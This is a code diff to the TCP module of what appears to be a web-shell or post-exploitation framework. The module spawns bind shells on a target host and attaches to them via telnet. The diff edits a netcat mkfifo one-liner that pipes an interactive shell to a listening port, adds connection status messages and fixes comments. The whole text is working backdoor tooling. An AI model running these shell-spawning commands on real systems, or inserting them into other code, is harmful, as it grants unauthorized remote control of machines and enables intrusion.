@@ -29,7 +29,7 @@ class Tcp(Module):
               background = True
               ),
             ShellCmd(
-              "rm -rf /tmp/.f;mkfifo /tmp/.f&&cat /tmp/.f|${shell} -i 2>&1|nc -l ${port} >/tmp/.f; rm -rf /tmp/.f",
+              "rm -rf /tmp/.f;mkfifo /tmp/.f&&cat /tmp/.f|${shell} -i 2>&1|nc -lp ${port} >/tmp/.f; rm -rf /tmp/.f",
               name = 'nc.bsd',
               target = Os.NIX,
               background = True
@@ -72,7 +72,7 @@ class Tcp(Module):
           { 'name' : '-vector', 'choices' : self.vectors.get_names() }
         ])
 
-    def run(self):
+    def run(self, catch_errors=True):
 
         # Run all the vectors
         for vector in self.vectors:
@@ -87,6 +87,8 @@ class Tcp(Module):
             # If set, skip autoconnect
             if self.args.get('no_autoconnect'): continue
 
+            print('Connecting...', end='', flush=True)
+
             # Give some time to spawn the shell
             time.sleep(1)
 
@@ -99,10 +101,13 @@ class Tcp(Module):
                 continue
 
             try:
-                telnetlib.Telnet(urlparsed.hostname, self.args['port'], timeout = 5).interact()
+                with telnetlib.Telnet() as tn:
+                    tn.open(urlparsed.hostname, self.args['port'], timeout = 5)
+                    print('\rConnected.   ')
+                    tn.interact()
 
-                # If telnetlib does not rise an exception, we can assume that
-                # ended correctly and return from `run()`
+                # If telnetlib does not raise an exception, we can assume that
+                # it ended correctly and return from `run()`
                 return
             except Exception as e:
                 log.debug(
